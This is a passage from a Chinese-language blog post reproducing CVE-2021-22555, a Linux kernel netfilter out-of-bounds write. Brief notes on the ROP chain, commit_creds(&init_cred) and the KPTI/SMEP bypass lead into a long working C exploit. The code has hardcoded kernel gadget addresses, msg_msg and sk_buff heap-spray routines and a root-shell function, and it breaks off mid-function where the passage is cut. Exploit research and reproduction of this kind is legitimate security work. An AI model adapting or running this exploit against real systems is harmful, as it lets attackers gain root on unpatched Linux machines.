class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>而用户空间隔离出独立的命名空间后就能拥有<code>CAP_NET_ADMIN</code>权限，所以需要，其实也不是太懂这个干啥的。</p>
<p>其他的好像也没有什么了，就是最后的<code>ROP</code>链条方面的东西，由于最后触发劫持程序流的时候，<code>rsi</code>为<code>UAF</code>对象地址，所以利用<code>gadget</code>先进行栈劫持<code>rsp</code>，然后使用利用<code>commit_creds(&amp;init_cred)</code>获取ROOT权限，之后使用<code>SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE</code>绕过<code>KPTI</code>和<code>SMEP</code>即可。</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/#Final-EXPLOIT" >【CVE.0x07】CVE-2021-22555 漏洞复现及简要分析 - arttnba3’s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240006" >Linux Kernel KPTI保护绕过 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="3-最终EXP"   >
          <a href="#3-最终EXP" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-最终EXP" class="headerlink" title="(3)最终EXP"></a>(3)最终EXP</h3>
      <p>主要是<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/bsauce/kernel-exploit-factory" >bsauce师傅的EXP</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>和<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/#Final-EXPLOIT" >arttnba3师傅的EXP</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，然后改巴改巴，加了点东西，替换了一下ROP链条什么的。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//compile exp: $ gcc -m32 -static -masm=intel -o exploit exploit.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netfilter_ipv4/ip_tables.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// clang-format on</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_SIZE 0x400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_SOCKETS 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_SKBUFFS 128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_PIPEFDS 256</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_MSQIDS 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HOLE_STEP 1024</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MTYPE_PRIMARY 0x41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MTYPE_SECONDARY 0x42</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MTYPE_FAKE 0x1337</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_TAG 0xAAAAAAAA</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Gadget </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUSH_RSI_JMP_RSI_0x2E 0xffffffff81b4e244</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADD_RSP_0x98_RET 0xffffffff81a7895e</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RSP_RET 0xffffffff81900644</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RDI_RET 0xffffffff81001629</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_CRED 0xffffffff8244c8a0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS 0xffffffff8108e690</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00df0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff82019340</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//pt_regs</span></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_eflags;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// clang-format on</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SKB_SHARED_INFO_SIZE 0x140</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_MSG_SIZE (sizeof(struct msg_msg))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_MSGSEG_SIZE (sizeof(struct msg_msgseg))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//some struct</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">  <span class="keyword">uint64_t</span> m_list_next;</span><br><span class="line">  <span class="keyword">uint64_t</span> m_list_prev;</span><br><span class="line">  <span class="keyword">uint64_t</span> m_type;</span><br><span class="line">  <span class="keyword">uint64_t</span> m_ts;</span><br><span class="line">  <span class="keyword">uint64_t</span> next;</span><br><span class="line">  <span class="keyword">uint64_t</span> security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span></span><br><span class="line">  <span class="keyword">uint64_t</span> next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">  <span class="keyword">uint64_t</span> page;</span><br><span class="line">  <span class="keyword">uint32_t</span> offset;</span><br><span class="line">  <span class="keyword">uint32_t</span> len;</span><br><span class="line">  <span class="keyword">uint64_t</span> ops;</span><br><span class="line">  <span class="keyword">uint32_t</span> flags;</span><br><span class="line">  <span class="keyword">uint32_t</span> pad;</span><br><span class="line">  <span class="keyword">uint64_t</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">  <span class="keyword">uint64_t</span> confirm;</span><br><span class="line">  <span class="keyword">uint64_t</span> release;</span><br><span class="line">  <span class="keyword">uint64_t</span> steal;</span><br><span class="line">  <span class="keyword">uint64_t</span> get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">long</span> mtype;</span><br><span class="line">  <span class="keyword">char</span> mtext[PRIMARY_SIZE - MSG_MSG_SIZE];</span><br><span class="line">&#125; msg_primary;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">long</span> mtype;</span><br><span class="line">  <span class="keyword">char</span> mtext[SECONDARY_SIZE - MSG_MSG_SIZE];</span><br><span class="line">&#125; msg_secondary;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">long</span> mtype;</span><br><span class="line">  <span class="keyword">char</span> mtext[PAGE_SIZE - MSG_MSG_SIZE + PAGE_SIZE - MSG_MSGSEG_SIZE];</span><br><span class="line">&#125; msg_fake;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build_msg_msg</span><span class="params">(struct msg_msg *msg, <span class="keyword">uint64_t</span> m_list_next,</span></span></span><br><span class="line"><span class="params"><span class="function">                   <span class="keyword">uint64_t</span> m_list_prev, <span class="keyword">uint64_t</span> m_ts, <span class="keyword">uint64_t</span> next)</span> </span>&#123;</span><br><span class="line">  msg-&gt;m_list_next = m_list_next;</span><br><span class="line">  msg-&gt;m_list_prev = m_list_prev;</span><br><span class="line">  msg-&gt;m_type = MTYPE_FAKE;</span><br><span class="line">  msg-&gt;m_ts = m_ts;</span><br><span class="line">  msg-&gt;next = next;</span><br><span class="line">  msg-&gt;security = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getRootShell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;failed to gain the root!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, esp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_eflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">write_msg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">const</span> <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span> </span>&#123;</span><br><span class="line">  *(<span class="keyword">long</span> *)msgp = msgtyp;</span><br><span class="line">  <span class="keyword">if</span> (msgsnd(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] msgsnd&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">peek_msg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT) &lt;</span><br><span class="line">      <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] msgrcv&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_msg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), msgtyp, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] msgrcv&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spray_skbuff</span><span class="params">(<span class="keyword">int</span> ss[NUM_SOCKETS][<span class="number">2</span>], <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; NUM_SKBUFFS; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (write(ss[i][<span class="number">0</span>], buf, size) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] write&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">free_skbuff</span><span class="params">(<span class="keyword">int</span> ss[NUM_SOCKETS][<span class="number">2</span>], <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; NUM_SKBUFFS; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (read(ss[i][<span class="number">1</span>], buf, size) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] read&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">trigger_oob_write</span><span class="params">(<span class="keyword">int</span> s)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((__<span class="title">packed__</span>)) &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipt_replace</span> <span class="title">replace</span>;</span>                     <span class="comment">// 0x60</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipt_entry</span> <span class="title">entry</span>;</span>                         <span class="comment">// 0x70</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_match</span> <span class="title">match</span>;</span>                    <span class="comment">// 0x20</span></span><br><span class="line">    <span class="keyword">char</span> pad[<span class="number">0x108</span> + PRIMARY_SIZE - <span class="number">0x200</span> - <span class="number">0x2</span>];   <span class="comment">//  kvmalloc_size = sizeof(xt_table_info) + ipt_replace-&gt;size =  0x40 + (0xFB8 - 0x2) = 0xFF8 - 0x2</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_target</span> <span class="title">target</span>;</span>                  <span class="comment">// 